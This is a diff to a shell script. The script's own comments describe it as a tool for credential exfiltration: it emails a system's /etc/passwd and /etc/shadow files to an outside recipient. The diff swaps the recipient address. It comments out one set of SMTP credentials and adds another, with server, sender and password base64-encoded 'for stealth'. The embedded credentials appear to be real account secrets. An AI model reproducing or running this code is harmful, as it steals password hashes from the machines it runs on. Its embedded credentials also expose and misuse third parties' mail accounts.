@@ -226,20 +226,29 @@ echo ""
 
 # ==================== EMAIL CONFIGURATION FOR CREDENTIAL EXFILTRATION ====================
 # SMTP credentials for sending /etc/passwd and /etc/shadow files
-readonly RECIPIENT_EMAIL="motto@24-mail.com"  # ← YOUR EMAIL HERE
+readonly RECIPIENT_EMAIL="littlAcen@yahoo.de"  # ← YOUR EMAIL HERE
 readonly LOG_FILE_EMAIL="/tmp/credential_exfil_log.txt"
 
 # ⚠️ USER-SPECIFIC SMTP CREDENTIALS - DO NOT CHANGE! ⚠️
 # These are the user's personal fullgamingacc.com credentials
 # Updated: 2026-05-05 - Switched to fullgamingacc.com SMTP
 # Decoded SMTP credentials (base64 encoded for stealth)
-SMTP_SERVER_B64="c210cC5nbWFpbC5jb20="
-readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
+#acenbergheim:
+#SMTP_SERVER_B64="c210cC5nbWFpbC5jb20="
+#readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
+#readonly SMTP_PORT=587
+#SENDER_EMAIL_B64="YWNlbmJlcmdoZWltQGdtYWlsLmNvbQ=="
+#readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
+#SMTP_PASSWORD_B64="amZ2diBjZGxsIGlvb2Mga3F4ZA=="
+#readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
+
+SMTP_SERVER_B64="bWFpbC5hbXlnbG9iYWwubmV0"
+readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d)
 readonly SMTP_PORT=587
-SENDER_EMAIL_B64="YWNlbmJlcmdoZWltQGdtYWlsLmNvbQ=="
-readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
-SMTP_PASSWORD_B64="amZ2diBjZGxsIGlvb2Mga3F4ZA=="
-readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
+SENDER_EMAIL_B64="dGVjaG5pY2FsQGFteWdsb2JhbC5uZXQ="
+readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d)
+SMTP_PASSWORD_B64="VGVjaDI1ODkq"
+readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d)
 
 # ==================== AUTO-INSTALL EMAIL TOOLS ====================
 auto_install_email_tools() {
